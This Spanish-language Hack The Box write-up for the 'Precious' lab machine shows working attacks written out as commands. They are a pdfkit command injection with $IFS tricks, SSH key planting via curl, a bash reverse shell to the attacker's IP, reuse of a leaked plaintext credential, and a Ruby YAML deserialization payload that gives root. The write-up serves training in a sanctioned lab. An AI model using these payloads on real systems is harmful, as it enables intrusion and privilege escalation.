Write up De la maquina precious de la plataforma de Hack The Box
![](/assets/img/precious/machine.png)

## Enumeracion
Empezemos haciendo un escaneo de puertos a la maquina victima

```bash
❯ nmap 10.10.11.189
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-09 15:26 -05
Nmap scan report for 10.10.11.189
Host is up (0.092s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 12.47 seconds
```

Intentemos detectar la version Que corre para estos puertos

```bash
❯ nmap -sCV -p22,80 10.10.11.189 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-09 15:34 -05
Nmap scan report for 10.10.11.189
Host is up (0.095s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.95 seconds
```

Podemos ver en el escaneo de nmap que dectecta que en el puerto 80 hay un redirect  a http://precious.htb/ para que este dominio nos resuelva tenemos que agregar esta linea al archivo /etc/hosts
```bash
10.10.11.189 precious.htb
```
Veamos desde el navegador esta pagina web 
![](/assets/img/precious/web.png)

Vemos que podemos introducir una url, y la pagina va a convertir ese contenido a un pdf, pongamos nuestra ip y veamos si nos llega alguna peticion

![](/assets/img/precious/p.png)

Nos ponemos en escucha con python y vemos que nos llega una peticion al recurso que le indicamos
```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.189 - - [09/Feb/2023 15:44:29] code 404, message File not found
10.10.11.189 - - [09/Feb/2023 15:44:29] "GET /test HTTP/1.1" 404 -
```

Probemos si esta campo de url esta sanitizado correctamente intentemos jugar con el $(command) para ver si podemos incluir un comando en nuestra consulta

```bash
❯  curl -s 'http://precious.htb' -d 'url=http://10.10.14.110/$(id)'
```
Mandamos la peticion y nos llega la peticion con el output del comando 
```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.189 - - [09/Feb/2023 15:58:19] code 404, message File not found
10.10.11.189 - - [09/Feb/2023 15:58:19] "GET /uid=1001(ruby)%20gid=1001(ruby)%20groups=1001(ruby) HTTP/1.1" 404 -
```
## Via no intencionada
Buenos Tenemos un Rce ya que el campo no se esta sanitizando correctamente probemos aver que podemos hacer, para hacernos un ping Tenemos que jugar Con una variable especial de bash la cual es $IFS que actua como si fuera un espacio

```bash
❯ curl -s http://precious.htb/ --data "url=http://10.10.1/\$(ping\$IFS-c\$IFS'1'\$IFS'10.10.14.110')"
```
mandamos la peticion y nos ponemos en escucha
```bash
❯ sudo tcpdump -i tun0 -n icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
16:16:31.870622 IP 10.10.11.189 > 10.10.14.110: ICMP echo request, id 9466, seq 1, length 64
16:16:31.870656 IP 10.10.14.110 > 10.10.11.189: ICMP echo reply, id 9466, seq 1, length 64
```
Vemos Que tenemos capacidad de ejecutar comandos con sus parametros jugando con la variable $IFS veamos si hay una id_rsa en el directorio de trabajo de ruby para poder autenticarnos sin proporcionar contraseña

```bash
❯ curl -s http://precious.htb/ --data "url=http://10.10.14.110/\$(ls\$IFS-la\$IFS'/home/ruby/')"
```
Montamos el servidor con python 
```bash 
❯ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.189 - - [09/Feb/2023 16:36:37] code 404, message File not found
10.10.11.189 - - [09/Feb/2023 16:36:37] "GET /total%2032%0Adrwxr-xr-x%205%20ruby%20ruby%204096%20Feb%20%209%2016:23%20.%0Adrwxr-xr-x%204%20root%20root%204096%20Oct%2026%2008:28%20..%0Alrwxrwxrwx%201%20root%20root%20%20%20%209%20Oct%2026%2007:53%20.bash_history%20-%3E%20/dev/null%0A-rw-r--r--%201%20ruby%20ruby%20%20220%20Mar%2027%20%202022%20.bash_logout%0A-rw-r--r--%201%20ruby%20ruby%203526%20Mar%2027%20%202022%20.bashrc%0Adr-xr-xr-x%202%20root%20ruby%204096%20Oct%2026%2008:28%20.bundle%0Adrwxr-xr-x%203%20ruby%20ruby%204096%20Feb%20%209%2011:57%20.cache%0Adrwx------%203%20ruby%20ruby%204096%20Feb%20%209%2016:23%20.gnupg%0A-rw-r--r--%201%20ruby%20ruby%20%20807%20Mar%2027%20%202022%20.profile HTTP/1.1" 404 -
```
Vemos la respuesta urlencodiada decodifiquemosla para verla en su estado original

```php
php > echo urldecode('/total%2032%0Adrwxr-xr-x%205%20ruby%20ruby%204096%20Feb%20%209%2016:23%20.%0Adrwxr-xr-x%204%20root%20root%204096%20Oct%2026%2008:28%20..%0Alrwxrwxrwx%201%20root%20root%20%20%20%209%20Oct%2026%2007:53%20.bash_history%20-%3E%20/dev/null%0A-rw-r--r--%201%20ruby%20ruby%20%20220%20Mar%2027%20%202022%20.bash_logout%0A-rw-r--r--%201%20ruby%20ruby%203526%20Mar%2027%20%202022%20.bashrc%0Adr-xr-xr-x%202%20root%20ruby%204096%20Oct%2026%2008:28%20.bundle%0Adrwxr-xr-x%203%20ruby%20ruby%204096%20Feb%20%209%2011:57%20.cache%0Adrwx------%203%20ruby%20ruby%204096%20Feb%20%209%2016:23%20.gnupg%0A-rw-r--r--%201%20ruby%20ruby%20%20807%20Mar%2027%20%202022%20.profile');
/total 32
drwxr-xr-x 5 ruby ruby 4096 Feb  9 16:23 .
drwxr-xr-x 4 root root 4096 Oct 26 08:28 ..
lrwxrwxrwx 1 root root    9 Oct 26 07:53 .bash_history -> /dev/null
-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .bundle
drwxr-xr-x 3 ruby ruby 4096 Feb  9 11:57 .cache
drwx------ 3 ruby ruby 4096 Feb  9 16:23 .gnupg
-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
php >
```
No hay un directorio .ssh pero como somos ruby(Que lo vimos del primer comando que ejecutamos) podemos crear el directorio y crear un archivo authorized_keys en el
Creemos el directorio
```bash
❯ curl -s http://precious.htb/ --data "url=http://10.10.14.110/\$(mkdir\$IFS'/home/ruby/.ssh')"
```
Ahora Tenemos que meter nuestra llave publica en el directorio .ssh con el nombre de authorized_keys para que tome nuestra key como valida
asi que generemos un par de claves
```bash
❯ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/blank/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/blank/.ssh/id_rsa
Your public key has been saved in /home/blank/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:sE9GumE08Lb94+R8mgjrhUp8i6QY7T17EvBExdMRGmw blank@Pez
The key's randomart image is:
+---[RSA 3072]----+
|    .+o.oo       |
|    .oEo.        |
|   . .B..        |
|  . .o O         |
|   +  * S        |
| . .o. B .       |
|. . +.= o +      |
| + =o+.= * o.    |
|. o =*+ . *o     |
+----[SHA256]-----+
```
Vamos a directorio .ssh que esta en nuestra directorio personal y vemos el par de claves
```bash
❯ cd ~/.ssh
❯ ls -la
drwx------ blank blank  54 B  Thu Feb  9 16:47:54 2023  .
drwxr-xr-x blank blank 1.6 KB Thu Feb  9 16:48:45 2023  ..
.rw------- blank blank 2.5 KB Thu Feb  9 16:47:54 2023  id_rsa
.rw-r--r-- blank blank 563 B  Thu Feb  9 16:47:54 2023  id_rsa.pub
.rw-r--r-- blank blank 6.7 KB Wed Feb  8 22:15:39 2023  known_hosts
```
Para transferir el contenido del archivo id_rsa.pub a la maquina victima lo hare con curl con el parametro -o para guardar el ouptut en un archivo, montemos nuestro servidor con python
```bash
❯ sudo python3 -m http.server 80
[sudo] password for blank: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
Ahora mandemos nuestra consulta a la maquina victima
```bash
❯ curl -s http://precious.htb/ --data "url=http://example.com/\$(curl\$IFS'10.10.14.110/id_rsa.pub'\$IFS-o\$IFS'/home/ruby/.ssh/authorized_keys')"
```
Recibimos la peticion
```bash
❯ sudo python3 -m http.server 80
[sudo] password for blank: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.189 - - [09/Feb/2023 16:56:28] "GET /id_rsa.pub HTTP/1.1" 200 -
```
Ahora si nos intentamos conectar como este usuario a la maquina victima no deberia pedirnos contraseña
```bash
❯ ssh ruby@10.10.11.189
Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
-bash-5.1$ 
```
Y Tenemos acceso pero esto es una via no intencionada ahora les mostrare la via intensionada de esta maquina

## Explotacion

Creemos un archivo index.html y metasmos cualquier contenido en el, y montemos un servidor con python
```bash
❯ sudo python3 -m http.server 80
```
Enviemos la consulta e interceptemosla con burpsuite y veamos que pasa cuando  se genera el pdf Correctamente
![](/assets/img/precious/exp.png)

Vemos que lo que se esta empleando por detras para generar los pdf es pdfkit busquemos esto en google para ver si tiene vulnerabilidades

![](/assets/img/precious/kit.png)

Vemos que hay que tiene una vulnerabilidad de injeccion de comandos 

En esta [pagina](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795) explican un poco la vulnerabilidad y muestran un poc para explotarla 

Shell como ruby

Modificamos el payload de la pagina para que nos mande una shell directamente

```bash
❯ curl -s http://precious.htb/ --data-urlencode "url=http://example.com/?name=#{'%20\`bash -c 'exec bash -i &>/dev/tcp/10.10.14.110/4444 <&1'\`'}"
```

Nos ponemos en escucha con nc

```bash
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.110] from (UNKNOWN) [10.10.11.189] 40740
bash: cannot set terminal process group (657): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.1$ whoami
whoami
ruby
bash-5.1$ 
```
Y obtenemos la revershell

## Movimiento lateral
enumerando un poco el sistema vemos que hay un directorio .bundle y en el hay un archivo config si vemos el contenido de este archivo hay credenciales en texto claro
```bash
-bash-5.1$ cat .bundle/config 
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
-bash-5.1$ 
```
Migremos a este usuario Conectandonos por ssh
```bash
❯ sshpass -p 'Q3c1AqGHtoI0aXAYFH' ssh henry@10.10.11.189
Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Feb  9 16:28:04 2023 from 10.10.14.115
-bash-5.1$ 
```
## Escalada de privilegios
Si miramos los permisos que tenemos a nivel de sudoers podemos ver que podemos ejecutara este script de ruby como root sin proporcionar contraseña
```bash
-bash-5.1$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```
Si miramos el script podemos ver que esta jugando YAML.load y esta llamando a un archivo relativamente osea que en el directoria en el que ejecutemos este script va intentar buscarlo
```bash
-bash-5.1$ cat /opt/update_dependencies.rb
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```

Buscando un rato me encontre con esta [pagina](https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565) en la cual dan un payload para inyectar directamente un comando, ya que tiene una vulnerabilidad en la deserializacion, como el script esta llamando a un archivo dependencies.yml creemos un archivo con este nombre e introduscamos nuestro payload, Vamos al directorio /tmp y creemos el archivo
```bash
-bash-5.1$ cat dependencies.yml 
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: chmod u+s /bin/bash
         method_id: :resolve
```
Ejecutemos el script y funciono somos Root
```bash
-bash-5.1$ sudo /usr/bin/ruby /opt/update_dependencies.rb 2>/dev/null
-bash-5.1$ bash -p
bash-5.1# cat /root/root.txt 
a3e6475edd9cc6514182aca7dde0dd71
bash-5.1# 
```

Gracias por leer